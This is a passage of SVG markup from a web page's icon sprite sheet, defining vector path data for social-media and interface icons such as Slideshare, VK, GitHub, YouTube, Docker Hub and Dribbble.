<path class="path1" d="M10.661 7.518v20.946q0 0.446-0.223 0.759t-0.652 0.313q-0.304 0-0.589-0.143l-8.304-4.161q-0.375-0.179-0.634-0.598t-0.259-0.83v-20.357q0-0.357 0.179-0.607t0.518-0.25q0.25 0 0.786 0.268l9.125 4.571q0.054 0.054 0.054 0.089zM11.804 9.321l9.536 15.464-9.536-4.75v-10.714zM32 9.643v18.821q0 0.446-0.25 0.723t-0.679 0.277-0.839-0.232l-7.875-3.929zM31.946 7.5q0 0.054-4.58 7.491t-5.366 8.705l-6.964-11.321 5.786-9.411q0.304-0.5 0.929-0.5 0.25 0 0.464 0.107l9.661 4.821q0.071 0.036 0.071 0.107z"></path>
</symbol>
<symbol id="icon-slideshare" viewBox="0 0 32 32">
<path class="path1" d="M15.589 13.214q0 1.482-1.134 2.545t-2.723 1.063-2.723-1.063-1.134-2.545q0-1.5 1.134-2.554t2.723-1.054 2.723 1.054 1.134 2.554zM24.554 13.214q0 1.482-1.125 2.545t-2.732 1.063q-1.589 0-2.723-1.063t-1.134-2.545q0-1.5 1.134-2.554t2.723-1.054q1.607 0 2.732 1.054t1.125 2.554zM28.571 16.429v-11.911q0-1.554-0.571-2.205t-1.982-0.652h-19.857q-1.482 0-2.009 0.607t-0.527 2.25v12.018q0.768 0.411 1.58 0.714t1.446 0.5 1.446 0.33 1.268 0.196 1.25 0.071 1.045 0.009 1.009-0.036 0.795-0.036q1.214-0.018 1.696 0.482 0.107 0.107 0.179 0.161 0.464 0.446 1.089 0.911 0.125-1.625 2.107-1.554 0.089 0 0.652 0.027t0.768 0.036 0.813 0.018 0.946-0.018 0.973-0.080 1.089-0.152 1.107-0.241 1.196-0.348 1.205-0.482 1.286-0.616zM31.482 16.339q-2.161 2.661-6.643 4.5 1.5 5.089-0.411 8.304-1.179 2.018-3.268 2.643-1.857 0.571-3.25-0.268-1.536-0.911-1.464-2.929l-0.018-5.821v-0.018q-0.143-0.036-0.438-0.107t-0.42-0.089l-0.018 6.036q0.071 2.036-1.482 2.929-1.411 0.839-3.268 0.268-2.089-0.643-3.25-2.679-1.875-3.214-0.393-8.268-4.482-1.839-6.643-4.5-0.446-0.661-0.071-1.125t1.071 0.018q0.054 0.036 0.196 0.125t0.196 0.143v-12.393q0-1.286 0.839-2.196t2.036-0.911h22.446q1.196 0 2.036 0.911t0.839 2.196v12.393l0.375-0.268q0.696-0.482 1.071-0.018t-0.071 1.125z"></path>
</symbol>
<symbol id="icon-snapchat-ghost" viewBox="0 0 30 32">
<path class="path1" d="M15.143 2.286q2.393-0.018 4.295 1.223t2.92 3.438q0.482 1.036 0.482 3.196 0 0.839-0.161 3.411 0.25 0.125 0.5 0.125 0.321 0 0.911-0.241t0.911-0.241q0.518 0 1 0.321t0.482 0.821q0 0.571-0.563 0.964t-1.232 0.563-1.232 0.518-0.563 0.848q0 0.268 0.214 0.768 0.661 1.464 1.83 2.679t2.58 1.804q0.5 0.214 1.429 0.411 0.5 0.107 0.5 0.625 0 1.25-3.911 1.839-0.125 0.196-0.196 0.696t-0.25 0.83-0.589 0.33q-0.357 0-1.107-0.116t-1.143-0.116q-0.661 0-1.107 0.089-0.571 0.089-1.125 0.402t-1.036 0.679-1.036 0.723-1.357 0.598-1.768 0.241q-0.929 0-1.723-0.241t-1.339-0.598-1.027-0.723-1.036-0.679-1.107-0.402q-0.464-0.089-1.125-0.089-0.429 0-1.17 0.134t-1.045 0.134q-0.446 0-0.625-0.33t-0.25-0.848-0.196-0.714q-3.911-0.589-3.911-1.839 0-0.518 0.5-0.625 0.929-0.196 1.429-0.411 1.393-0.571 2.58-1.804t1.83-2.679q0.214-0.5 0.214-0.768 0-0.5-0.563-0.848t-1.241-0.527-1.241-0.563-0.563-0.938q0-0.482 0.464-0.813t0.982-0.33q0.268 0 0.857 0.232t0.946 0.232q0.321 0 0.571-0.125-0.161-2.536-0.161-3.393 0-2.179 0.482-3.214 1.143-2.446 3.071-3.536t4.714-1.125z"></path>
</symbol>
<symbol id="icon-yelp" viewBox="0 0 27 32">
<path class="path1" d="M13.804 23.554v2.268q-0.018 5.214-0.107 5.446-0.214 0.571-0.911 0.714-0.964 0.161-3.241-0.679t-2.902-1.589q-0.232-0.268-0.304-0.643-0.018-0.214 0.071-0.464 0.071-0.179 0.607-0.839t3.232-3.857q0.018 0 1.071-1.25 0.268-0.339 0.705-0.438t0.884 0.063q0.429 0.179 0.67 0.518t0.223 0.75zM11.143 19.071q-0.054 0.982-0.929 1.25l-2.143 0.696q-4.911 1.571-5.214 1.571-0.625-0.036-0.964-0.643-0.214-0.446-0.304-1.339-0.143-1.357 0.018-2.973t0.536-2.223 1-0.571q0.232 0 3.607 1.375 1.25 0.518 2.054 0.839l1.5 0.607q0.411 0.161 0.634 0.545t0.205 0.866zM25.893 24.375q-0.125 0.964-1.634 2.875t-2.42 2.268q-0.661 0.25-1.125-0.125-0.25-0.179-3.286-5.125l-0.839-1.375q-0.25-0.375-0.205-0.821t0.348-0.821q0.625-0.768 1.482-0.464 0.018 0.018 2.125 0.714 3.625 1.179 4.321 1.42t0.839 0.366q0.5 0.393 0.393 1.089zM13.893 13.089q0.089 1.821-0.964 2.179-1.036 0.304-2.036-1.268l-6.75-10.679q-0.143-0.625 0.339-1.107 0.732-0.768 3.705-1.598t4.009-0.563q0.714 0.179 0.875 0.804 0.054 0.321 0.393 5.455t0.429 6.777zM25.714 15.018q0.054 0.696-0.464 1.054-0.268 0.179-5.875 1.536-1.196 0.268-1.625 0.411l0.018-0.036q-0.411 0.107-0.821-0.071t-0.661-0.571q-0.536-0.839 0-1.554 0.018-0.018 1.339-1.821 2.232-3.054 2.679-3.643t0.607-0.696q0.5-0.339 1.161-0.036 0.857 0.411 2.196 2.384t1.446 2.991v0.054z"></path>
</symbol>
<symbol id="icon-vine" viewBox="0 0 27 32">
<path class="path1" d="M26.732 14.768v3.536q-1.804 0.411-3.536 0.411-1.161 2.429-2.955 4.839t-3.241 3.848-2.286 1.902q-1.429 0.804-2.893-0.054-0.5-0.304-1.080-0.777t-1.518-1.491-1.83-2.295-1.92-3.286-1.884-4.357-1.634-5.616-1.259-6.964h5.054q0.464 3.893 1.25 7.116t1.866 5.661 2.17 4.205 2.5 3.482q3.018-3.018 5.125-7.25-2.536-1.286-3.982-3.929t-1.446-5.946q0-3.429 1.857-5.616t5.071-2.188q3.179 0 4.875 1.884t1.696 5.313q0 2.839-1.036 5.107-0.125 0.018-0.348 0.054t-0.821 0.036-1.125-0.107-1.107-0.455-0.902-0.92q0.554-1.839 0.554-3.286 0-1.554-0.518-2.357t-1.411-0.804q-0.946 0-1.518 0.884t-0.571 2.509q0 3.321 1.875 5.241t4.768 1.92q1.107 0 2.161-0.25z"></path>
</symbol>
<symbol id="icon-vk" viewBox="0 0 35 32">
<path class="path1" d="M34.232 9.286q0.411 1.143-2.679 5.25-0.429 0.571-1.161 1.518-1.393 1.786-1.607 2.339-0.304 0.732 0.25 1.446 0.304 0.375 1.446 1.464h0.018l0.071 0.071q2.518 2.339 3.411 3.946 0.054 0.089 0.116 0.223t0.125 0.473-0.009 0.607-0.446 0.491-1.054 0.223l-4.571 0.071q-0.429 0.089-1-0.089t-0.929-0.393l-0.357-0.214q-0.536-0.375-1.25-1.143t-1.223-1.384-1.089-1.036-1.009-0.277q-0.054 0.018-0.143 0.063t-0.304 0.259-0.384 0.527-0.304 0.929-0.116 1.384q0 0.268-0.063 0.491t-0.134 0.33l-0.071 0.089q-0.321 0.339-0.946 0.393h-2.054q-1.268 0.071-2.607-0.295t-2.348-0.946-1.839-1.179-1.259-1.027l-0.446-0.429q-0.179-0.179-0.491-0.536t-1.277-1.625-1.893-2.696-2.188-3.768-2.33-4.857q-0.107-0.286-0.107-0.482t0.054-0.286l0.071-0.107q0.268-0.339 1.018-0.339l4.893-0.036q0.214 0.036 0.411 0.116t0.286 0.152l0.089 0.054q0.286 0.196 0.429 0.571 0.357 0.893 0.821 1.848t0.732 1.455l0.286 0.518q0.518 1.071 1 1.857t0.866 1.223 0.741 0.688 0.607 0.25 0.482-0.089q0.036-0.018 0.089-0.089t0.214-0.393 0.241-0.839 0.17-1.446 0-2.232q-0.036-0.714-0.161-1.304t-0.25-0.821l-0.107-0.214q-0.446-0.607-1.518-0.768-0.232-0.036 0.089-0.429 0.304-0.339 0.679-0.536 0.946-0.464 4.268-0.429 1.464 0.018 2.411 0.232 0.357 0.089 0.598 0.241t0.366 0.429 0.188 0.571 0.063 0.813-0.018 0.982-0.045 1.259-0.027 1.473q0 0.196-0.018 0.75t-0.009 0.857 0.063 0.723 0.205 0.696 0.402 0.438q0.143 0.036 0.304 0.071t0.464-0.196 0.679-0.616 0.929-1.196 1.214-1.92q1.071-1.857 1.911-4.018 0.071-0.179 0.179-0.313t0.196-0.188l0.071-0.054 0.089-0.045t0.232-0.054 0.357-0.009l5.143-0.036q0.696-0.089 1.143 0.045t0.554 0.295z"></path>
</symbol>
<symbol id="icon-search" viewBox="0 0 30 32">
<path class="path1" d="M20.571 14.857q0-3.304-2.348-5.652t-5.652-2.348-5.652 2.348-2.348 5.652 2.348 5.652 5.652 2.348 5.652-2.348 2.348-5.652zM29.714 29.714q0 0.929-0.679 1.607t-1.607 0.679q-0.964 0-1.607-0.679l-6.125-6.107q-3.196 2.214-7.125 2.214-2.554 0-4.884-0.991t-4.018-2.679-2.679-4.018-0.991-4.884 0.991-4.884 2.679-4.018 4.018-2.679 4.884-0.991 4.884 0.991 4.018 2.679 2.679 4.018 0.991 4.884q0 3.929-2.214 7.125l6.125 6.125q0.661 0.661 0.661 1.607z"></path>
</symbol>
<symbol id="icon-envelope-o" viewBox="0 0 32 32">
<path class="path1" d="M29.714 26.857v-13.714q-0.571 0.643-1.232 1.179-4.786 3.679-7.607 6.036-0.911 0.768-1.482 1.196t-1.545 0.866-1.83 0.438h-0.036q-0.857 0-1.83-0.438t-1.545-0.866-1.482-1.196q-2.821-2.357-7.607-6.036-0.661-0.536-1.232-1.179v13.714q0 0.232 0.17 0.402t0.402 0.17h26.286q0.232 0 0.402-0.17t0.17-0.402zM29.714 8.089v-0.438t-0.009-0.232-0.054-0.223-0.098-0.161-0.161-0.134-0.25-0.045h-26.286q-0.232 0-0.402 0.17t-0.17 0.402q0 3 2.625 5.071 3.446 2.714 7.161 5.661 0.107 0.089 0.625 0.527t0.821 0.67 0.795 0.563 0.902 0.491 0.768 0.161h0.036q0.357 0 0.768-0.161t0.902-0.491 0.795-0.563 0.821-0.67 0.625-0.527q3.714-2.946 7.161-5.661 0.964-0.768 1.795-2.063t0.83-2.348zM32 7.429v19.429q0 1.179-0.839 2.018t-2.018 0.839h-26.286q-1.179 0-2.018-0.839t-0.839-2.018v-19.429q0-1.179 0.839-2.018t2.018-0.839h26.286q1.179 0 2.018 0.839t0.839 2.018z"></path>
</symbol>
<symbol id="icon-close" viewBox="0 0 25 32">
<path class="path1" d="M23.179 23.607q0 0.714-0.5 1.214l-2.429 2.429q-0.5 0.5-1.214 0.5t-1.214-0.5l-5.25-5.25-5.25 5.25q-0.5 0.5-1.214 0.5t-1.214-0.5l-2.429-2.429q-0.5-0.5-0.5-1.214t0.5-1.214l5.25-5.25-5.25-5.25q-0.5-0.5-0.5-1.214t0.5-1.214l2.429-2.429q0.5-0.5 1.214-0.5t1.214 0.5l5.25 5.25 5.25-5.25q0.5-0.5 1.214-0.5t1.214 0.5l2.429 2.429q0.5 0.5 0.5 1.214t-0.5 1.214l-5.25 5.25 5.25 5.25q0.5 0.5 0.5 1.214z"></path>
</symbol>
<symbol id="icon-angle-down" viewBox="0 0 21 32">
<path class="path1" d="M19.196 13.143q0 0.232-0.179 0.411l-8.321 8.321q-0.179 0.179-0.411 0.179t-0.411-0.179l-8.321-8.321q-0.179-0.179-0.179-0.411t0.179-0.411l0.893-0.893q0.179-0.179 0.411-0.179t0.411 0.179l7.018 7.018 7.018-7.018q0.179-0.179 0.411-0.179t0.411 0.179l0.893 0.893q0.179 0.179 0.179 0.411z"></path>
</symbol>
<symbol id="icon-folder-open" viewBox="0 0 34 32">
<path class="path1" d="M33.554 17q0 0.554-0.554 1.179l-6 7.071q-0.768 0.911-2.152 1.545t-2.563 0.634h-19.429q-0.607 0-1.080-0.232t-0.473-0.768q0-0.554 0.554-1.179l6-7.071q0.768-0.911 2.152-1.545t2.563-0.634h19.429q0.607 0 1.080 0.232t0.473 0.768zM27.429 10.857v2.857h-14.857q-1.679 0-3.518 0.848t-2.929 2.134l-6.107 7.179q0-0.071-0.009-0.223t-0.009-0.223v-17.143q0-1.643 1.179-2.821t2.821-1.179h5.714q1.643 0 2.821 1.179t1.179 2.821v0.571h9.714q1.643 0 2.821 1.179t1.179 2.821z"></path>
</symbol>
<symbol id="icon-twitter" viewBox="0 0 30 32">
<path class="path1" d="M28.929 7.286q-1.196 1.75-2.893 2.982 0.018 0.25 0.018 0.75 0 2.321-0.679 4.634t-2.063 4.437-3.295 3.759-4.607 2.607-5.768 0.973q-4.839 0-8.857-2.589 0.625 0.071 1.393 0.071 4.018 0 7.161-2.464-1.875-0.036-3.357-1.152t-2.036-2.848q0.589 0.089 1.089 0.089 0.768 0 1.518-0.196-2-0.411-3.313-1.991t-1.313-3.67v-0.071q1.214 0.679 2.607 0.732-1.179-0.786-1.875-2.054t-0.696-2.75q0-1.571 0.786-2.911 2.161 2.661 5.259 4.259t6.634 1.777q-0.143-0.679-0.143-1.321 0-2.393 1.688-4.080t4.080-1.688q2.5 0 4.214 1.821 1.946-0.375 3.661-1.393-0.661 2.054-2.536 3.179 1.661-0.179 3.321-0.893z"></path>
</symbol>
<symbol id="icon-facebook" viewBox="0 0 19 32">
<path class="path1" d="M17.125 0.214v4.714h-2.804q-1.536 0-2.071 0.643t-0.536 1.929v3.375h5.232l-0.696 5.286h-4.536v13.554h-5.464v-13.554h-4.554v-5.286h4.554v-3.893q0-3.321 1.857-5.152t4.946-1.83q2.625 0 4.071 0.214z"></path>
</symbol>
<symbol id="icon-github" viewBox="0 0 27 32">
<path class="path1" d="M13.714 2.286q3.732 0 6.884 1.839t4.991 4.991 1.839 6.884q0 4.482-2.616 8.063t-6.759 4.955q-0.482 0.089-0.714-0.125t-0.232-0.536q0-0.054 0.009-1.366t0.009-2.402q0-1.732-0.929-2.536 1.018-0.107 1.83-0.321t1.679-0.696 1.446-1.188 0.946-1.875 0.366-2.688q0-2.125-1.411-3.679 0.661-1.625-0.143-3.643-0.5-0.161-1.446 0.196t-1.643 0.786l-0.679 0.429q-1.661-0.464-3.429-0.464t-3.429 0.464q-0.286-0.196-0.759-0.482t-1.491-0.688-1.518-0.241q-0.804 2.018-0.143 3.643-1.411 1.554-1.411 3.679 0 1.518 0.366 2.679t0.938 1.875 1.438 1.196 1.679 0.696 1.83 0.321q-0.696 0.643-0.875 1.839-0.375 0.179-0.804 0.268t-1.018 0.089-1.17-0.384-0.991-1.116q-0.339-0.571-0.866-0.929t-0.884-0.429l-0.357-0.054q-0.375 0-0.518 0.080t-0.089 0.205 0.161 0.25 0.232 0.214l0.125 0.089q0.393 0.179 0.777 0.679t0.563 0.911l0.179 0.411q0.232 0.679 0.786 1.098t1.196 0.536 1.241 0.125 0.991-0.063l0.411-0.071q0 0.679 0.009 1.58t0.009 0.973q0 0.321-0.232 0.536t-0.714 0.125q-4.143-1.375-6.759-4.955t-2.616-8.063q0-3.732 1.839-6.884t4.991-4.991 6.884-1.839zM5.196 21.982q0.054-0.125-0.125-0.214-0.179-0.054-0.232 0.036-0.054 0.125 0.125 0.214 0.161 0.107 0.232-0.036zM5.75 22.589q0.125-0.089-0.036-0.286-0.179-0.161-0.286-0.054-0.125 0.089 0.036 0.286 0.179 0.179 0.286 0.054zM6.286 23.393q0.161-0.125 0-0.339-0.143-0.232-0.304-0.107-0.161 0.089 0 0.321t0.304 0.125zM7.036 24.143q0.143-0.143-0.071-0.339-0.214-0.214-0.357-0.054-0.161 0.143 0.071 0.339 0.214 0.214 0.357 0.054zM8.054 24.589q0.054-0.196-0.232-0.286-0.268-0.071-0.339 0.125t0.232 0.268q0.268 0.107 0.339-0.107zM9.179 24.679q0-0.232-0.304-0.196-0.286 0-0.286 0.196 0 0.232 0.304 0.196 0.286 0 0.286-0.196zM10.214 24.5q-0.036-0.196-0.321-0.161-0.286 0.054-0.25 0.268t0.321 0.143 0.25-0.25z"></path>
</symbol>
<symbol id="icon-bars" viewBox="0 0 27 32">
<path class="path1" d="M27.429 24v2.286q0 0.464-0.339 0.804t-0.804 0.339h-25.143q-0.464 0-0.804-0.339t-0.339-0.804v-2.286q0-0.464 0.339-0.804t0.804-0.339h25.143q0.464 0 0.804 0.339t0.339 0.804zM27.429 14.857v2.286q0 0.464-0.339 0.804t-0.804 0.339h-25.143q-0.464 0-0.804-0.339t-0.339-0.804v-2.286q0-0.464 0.339-0.804t0.804-0.339h25.143q0.464 0 0.804 0.339t0.339 0.804zM27.429 5.714v2.286q0 0.464-0.339 0.804t-0.804 0.339h-25.143q-0.464 0-0.804-0.339t-0.339-0.804v-2.286q0-0.464 0.339-0.804t0.804-0.339h25.143q0.464 0 0.804 0.339t0.339 0.804z"></path>
</symbol>
<symbol id="icon-google-plus" viewBox="0 0 41 32">
<path class="path1" d="M25.661 16.304q0 3.714-1.554 6.616t-4.429 4.536-6.589 1.634q-2.661 0-5.089-1.036t-4.179-2.786-2.786-4.179-1.036-5.089 1.036-5.089 2.786-4.179 4.179-2.786 5.089-1.036q5.107 0 8.768 3.429l-3.554 3.411q-2.089-2.018-5.214-2.018-2.196 0-4.063 1.107t-2.955 3.009-1.089 4.152 1.089 4.152 2.955 3.009 4.063 1.107q1.482 0 2.723-0.411t2.045-1.027 1.402-1.402 0.875-1.482 0.384-1.321h-7.429v-4.5h12.357q0.214 1.125 0.214 2.179zM41.143 14.125v3.75h-3.732v3.732h-3.75v-3.732h-3.732v-3.75h3.732v-3.732h3.75v3.732h3.732z"></path>
</symbol>
<symbol id="icon-linkedin" viewBox="0 0 27 32">
<path class="path1" d="M6.232 11.161v17.696h-5.893v-17.696h5.893zM6.607 5.696q0.018 1.304-0.902 2.179t-2.42 0.875h-0.036q-1.464 0-2.357-0.875t-0.893-2.179q0-1.321 0.92-2.188t2.402-0.866 2.375 0.866 0.911 2.188zM27.429 18.714v10.143h-5.875v-9.464q0-1.875-0.723-2.938t-2.259-1.063q-1.125 0-1.884 0.616t-1.134 1.527q-0.196 0.536-0.196 1.446v9.875h-5.875q0.036-7.125 0.036-11.554t-0.018-5.286l-0.018-0.857h5.875v2.571h-0.036q0.357-0.571 0.732-1t1.009-0.929 1.554-0.777 2.045-0.277q3.054 0 4.911 2.027t1.857 5.938z"></path>
</symbol>
<symbol id="icon-quote-right" viewBox="0 0 30 32">
<path class="path1" d="M13.714 5.714v12.571q0 1.857-0.723 3.545t-1.955 2.92-2.92 1.955-3.545 0.723h-1.143q-0.464 0-0.804-0.339t-0.339-0.804v-2.286q0-0.464 0.339-0.804t0.804-0.339h1.143q1.893 0 3.232-1.339t1.339-3.232v-0.571q0-0.714-0.5-1.214t-1.214-0.5h-4q-1.429 0-2.429-1t-1-2.429v-6.857q0-1.429 1-2.429t2.429-1h6.857q1.429 0 2.429 1t1 2.429zM29.714 5.714v12.571q0 1.857-0.723 3.545t-1.955 2.92-2.92 1.955-3.545 0.723h-1.143q-0.464 0-0.804-0.339t-0.339-0.804v-2.286q0-0.464 0.339-0.804t0.804-0.339h1.143q1.893 0 3.232-1.339t1.339-3.232v-0.571q0-0.714-0.5-1.214t-1.214-0.5h-4q-1.429 0-2.429-1t-1-2.429v-6.857q0-1.429 1-2.429t2.429-1h6.857q1.429 0 2.429 1t1 2.429z"></path>
</symbol>
<symbol id="icon-mail-reply" viewBox="0 0 32 32">
<path class="path1" d="M32 20q0 2.964-2.268 8.054-0.054 0.125-0.188 0.429t-0.241 0.536-0.232 0.393q-0.214 0.304-0.5 0.304-0.268 0-0.42-0.179t-0.152-0.446q0-0.161 0.045-0.473t0.045-0.42q0.089-1.214 0.089-2.196 0-1.804-0.313-3.232t-0.866-2.473-1.429-1.804-1.884-1.241-2.375-0.759-2.75-0.384-3.134-0.107h-4v4.571q0 0.464-0.339 0.804t-0.804 0.339-0.804-0.339l-9.143-9.143q-0.339-0.339-0.339-0.804t0.339-0.804l9.143-9.143q0.339-0.339 0.804-0.339t0.804 0.339 0.339 0.804v4.571h4q12.732 0 15.625 7.196 0.946 2.393 0.946 5.946z"></path>
</symbol>
<symbol id="icon-youtube" viewBox="0 0 27 32">
<path class="path1" d="M17.339 22.214v3.768q0 1.196-0.696 1.196-0.411 0-0.804-0.393v-5.375q0.393-0.393 0.804-0.393 0.696 0 0.696 1.196zM23.375 22.232v0.821h-1.607v-0.821q0-1.214 0.804-1.214t0.804 1.214zM6.125 18.339h1.911v-1.679h-5.571v1.679h1.875v10.161h1.786v-10.161zM11.268 28.5h1.589v-8.821h-1.589v6.75q-0.536 0.75-1.018 0.75-0.321 0-0.375-0.375-0.018-0.054-0.018-0.625v-6.5h-1.589v6.982q0 0.875 0.143 1.304 0.214 0.661 1.036 0.661 0.857 0 1.821-1.089v0.964zM18.929 25.857v-3.518q0-1.304-0.161-1.768-0.304-1-1.268-1-0.893 0-1.661 0.964v-3.875h-1.589v11.839h1.589v-0.857q0.804 0.982 1.661 0.982 0.964 0 1.268-0.982 0.161-0.482 0.161-1.786zM24.964 25.679v-0.232h-1.625q0 0.911-0.036 1.089-0.125 0.643-0.714 0.643-0.821 0-0.821-1.232v-1.554h3.196v-1.839q0-1.411-0.482-2.071-0.696-0.911-1.893-0.911-1.214 0-1.911 0.911-0.5 0.661-0.5 2.071v3.089q0 1.411 0.518 2.071 0.696 0.911 1.929 0.911 1.286 0 1.929-0.946 0.321-0.482 0.375-0.964 0.036-0.161 0.036-1.036zM14.107 9.375v-3.75q0-1.232-0.768-1.232t-0.768 1.232v3.75q0 1.25 0.768 1.25t0.768-1.25zM26.946 22.786q0 4.179-0.464 6.25-0.25 1.054-1.036 1.768t-1.821 0.821q-3.286 0.375-9.911 0.375t-9.911-0.375q-1.036-0.107-1.83-0.821t-1.027-1.768q-0.464-2-0.464-6.25 0-4.179 0.464-6.25 0.25-1.054 1.036-1.768t1.839-0.839q3.268-0.357 9.893-0.357t9.911 0.357q1.036 0.125 1.83 0.839t1.027 1.768q0.464 2 0.464 6.25zM9.125 0h1.821l-2.161 7.125v4.839h-1.786v-4.839q-0.25-1.321-1.089-3.786-0.661-1.839-1.161-3.339h1.893l1.268 4.696zM15.732 5.946v3.125q0 1.446-0.5 2.107-0.661 0.911-1.893 0.911-1.196 0-1.875-0.911-0.5-0.679-0.5-2.107v-3.125q0-1.429 0.5-2.089 0.679-0.911 1.875-0.911 1.232 0 1.893 0.911 0.5 0.661 0.5 2.089zM21.714 3.054v8.911h-1.625v-0.982q-0.946 1.107-1.839 1.107-0.821 0-1.054-0.661-0.143-0.429-0.143-1.339v-7.036h1.625v6.554q0 0.589 0.018 0.625 0.054 0.393 0.375 0.393 0.482 0 1.018-0.768v-6.804h1.625z"></path>
</symbol>
<symbol id="icon-dropbox" viewBox="0 0 32 32">
<path class="path1" d="M7.179 12.625l8.821 5.446-6.107 5.089-8.75-5.696zM24.786 22.536v1.929l-8.75 5.232v0.018l-0.018-0.018-0.018 0.018v-0.018l-8.732-5.232v-1.929l2.625 1.714 6.107-5.071v-0.036l0.018 0.018 0.018-0.018v0.036l6.125 5.071zM9.893 2.107l6.107 5.089-8.821 5.429-6.036-4.821zM24.821 12.625l6.036 4.839-8.732 5.696-6.125-5.089zM22.125 2.107l8.732 5.696-6.036 4.821-8.821-5.429z"></path>
</symbol>
<symbol id="icon-instagram" viewBox="0 0 27 32">
<path class="path1" d="M18.286 16q0-1.893-1.339-3.232t-3.232-1.339-3.232 1.339-1.339 3.232 1.339 3.232 3.232 1.339 3.232-1.339 1.339-3.232zM20.75 16q0 2.929-2.054 4.982t-4.982 2.054-4.982-2.054-2.054-4.982 2.054-4.982 4.982-2.054 4.982 2.054 2.054 4.982zM22.679 8.679q0 0.679-0.482 1.161t-1.161 0.482-1.161-0.482-0.482-1.161 0.482-1.161 1.161-0.482 1.161 0.482 0.482 1.161zM13.714 4.75q-0.125 0-1.366-0.009t-1.884 0-1.723 0.054-1.839 0.179-1.277 0.33q-0.893 0.357-1.571 1.036t-1.036 1.571q-0.196 0.518-0.33 1.277t-0.179 1.839-0.054 1.723 0 1.884 0.009 1.366-0.009 1.366 0 1.884 0.054 1.723 0.179 1.839 0.33 1.277q0.357 0.893 1.036 1.571t1.571 1.036q0.518 0.196 1.277 0.33t1.839 0.179 1.723 0.054 1.884 0 1.366-0.009 1.366 0.009 1.884 0 1.723-0.054 1.839-0.179 1.277-0.33q0.893-0.357 1.571-1.036t1.036-1.571q0.196-0.518 0.33-1.277t0.179-1.839 0.054-1.723 0-1.884-0.009-1.366 0.009-1.366 0-1.884-0.054-1.723-0.179-1.839-0.33-1.277q-0.357-0.893-1.036-1.571t-1.571-1.036q-0.518-0.196-1.277-0.33t-1.839-0.179-1.723-0.054-1.884 0-1.366 0.009zM27.429 16q0 4.089-0.089 5.661-0.179 3.714-2.214 5.75t-5.75 2.214q-1.571 0.089-5.661 0.089t-5.661-0.089q-3.714-0.179-5.75-2.214t-2.214-5.75q-0.089-1.571-0.089-5.661t0.089-5.661q0.179-3.714 2.214-5.75t5.75-2.214q1.571-0.089 5.661-0.089t5.661 0.089q3.714 0.179 5.75 2.214t2.214 5.75q0.089 1.571 0.089 5.661z"></path>
</symbol>
<symbol id="icon-flickr" viewBox="0 0 27 32">
<path class="path1" d="M22.286 2.286q2.125 0 3.634 1.509t1.509 3.634v17.143q0 2.125-1.509 3.634t-3.634 1.509h-17.143q-2.125 0-3.634-1.509t-1.509-3.634v-17.143q0-2.125 1.509-3.634t3.634-1.509h17.143zM12.464 16q0-1.571-1.107-2.679t-2.679-1.107-2.679 1.107-1.107 2.679 1.107 2.679 2.679 1.107 2.679-1.107 1.107-2.679zM22.536 16q0-1.571-1.107-2.679t-2.679-1.107-2.679 1.107-1.107 2.679 1.107 2.679 2.679 1.107 2.679-1.107 1.107-2.679z"></path>
</symbol>
<symbol id="icon-tumblr" viewBox="0 0 19 32">
<path class="path1" d="M16.857 23.732l1.429 4.232q-0.411 0.625-1.982 1.179t-3.161 0.571q-1.857 0.036-3.402-0.464t-2.545-1.321-1.696-1.893-0.991-2.143-0.295-2.107v-9.714h-3v-3.839q1.286-0.464 2.304-1.241t1.625-1.607 1.036-1.821 0.607-1.768 0.268-1.58q0.018-0.089 0.080-0.152t0.134-0.063h4.357v7.571h5.946v4.5h-5.964v9.25q0 0.536 0.116 1t0.402 0.938 0.884 0.741 1.455 0.25q1.393-0.036 2.393-0.518z"></path>
</symbol>
<symbol id="icon-dockerhub" viewBox="0 0 24 28">
<path class="path1" d="M1.597 10.257h2.911v2.83H1.597v-2.83zm3.573 0h2.91v2.83H5.17v-2.83zm0-3.627h2.91v2.829H5.17V6.63zm3.57 3.627h2.912v2.83H8.74v-2.83zm0-3.627h2.912v2.829H8.74V6.63zm3.573 3.627h2.911v2.83h-2.911v-2.83zm0-3.627h2.911v2.829h-2.911V6.63zm3.572 3.627h2.911v2.83h-2.911v-2.83zM12.313 3h2.911v2.83h-2.911V3zm-6.65 14.173c-.449 0-.812.354-.812.788 0 .435.364.788.812.788.447 0 .811-.353.811-.788 0-.434-.363-.788-.811-.788"></path>
<path class="path2" d="M28.172 11.721c-.978-.549-2.278-.624-3.388-.306-.136-1.146-.91-2.149-1.83-2.869l-.366-.286-.307.345c-.618.692-.8 1.845-.718 2.73.063.651.273 1.312.685 1.834-.313.183-.668.328-.985.434-.646.212-1.347.33-2.028.33H.083l-.042.429c-.137 1.432.065 2.866.674 4.173l.262.519.03.048c1.8 2.973 4.963 4.225 8.41 4.225 6.672 0 12.174-2.896 14.702-9.015 1.689.085 3.417-.4 4.243-1.968l.211-.4-.401-.223zM5.664 19.458c-.85 0-1.542-.671-1.542-1.497 0-.825.691-1.498 1.541-1.498.849 0 1.54.672 1.54 1.497s-.69 1.498-1.539 1.498z"></path>
</symbol>
<symbol id="icon-dribbble" viewBox="0 0 27 32">
<path class="path1" d="M18.286 26.786q-0.75-4.304-2.5-8.893h-0.036l-0.036 0.018q-0.286 0.107-0.768 0.295t-1.804 0.875-2.446 1.464-2.339 2.045-1.839 2.643l-0.268-0.196q3.286 2.679 7.464 2.679 2.357 0 4.571-0.929zM14.982 15.946q-0.375-0.875-0.946-1.982-5.554 1.661-12.018 1.661-0.018 0.125-0.018 0.375 0 2.214 0.786 4.223t2.214 3.598q0.893-1.589 2.205-2.973t2.545-2.223 2.33-1.446 1.777-0.857l0.661-0.232q0.071-0.018 0.232-0.063t0.232-0.080zM13.071 12.161q-2.143-3.804-4.357-6.75-2.464 1.161-4.179 3.321t-2.286 4.857q5.393 0 10.821-1.429zM25.286 17.857q-3.75-1.071-7.304-0.518 1.554 4.268 2.286 8.375 1.982-1.339 3.304-3.384t1.714-4.473zM10.911 4.625q-0.018 0-0.036 0.018 0.018-0.018 0.036-0.018zM21.446 7.214q-3.304-2.929-7.732-2.929-1.357 0-2.768 0.339 2.339 3.036 4.393 6.821 1.232-0.464 2.321-1.080t1.723-1.098 1.17-1.018 0.67-0.723zM25.429 15.875q-0.054-4.143-2.661-7.321l-0.018 0.018q-0.161 0.214-0.339 0.438t-0.777 0.795-1.268 1.080-1.786 1.161-2.348 1.152q0.446 0.946 0.786 1.696 0.036 0.107 0.116 0.313t0.134 0.295q0.643-0.089 1.33-0.125t1.313-0.036 1.232 0.027 1.143 0.071 1.009 0.098 0.857 0.116 0.652 0.107 0.446 0.080zM27.429 16q0 3.732-1.839 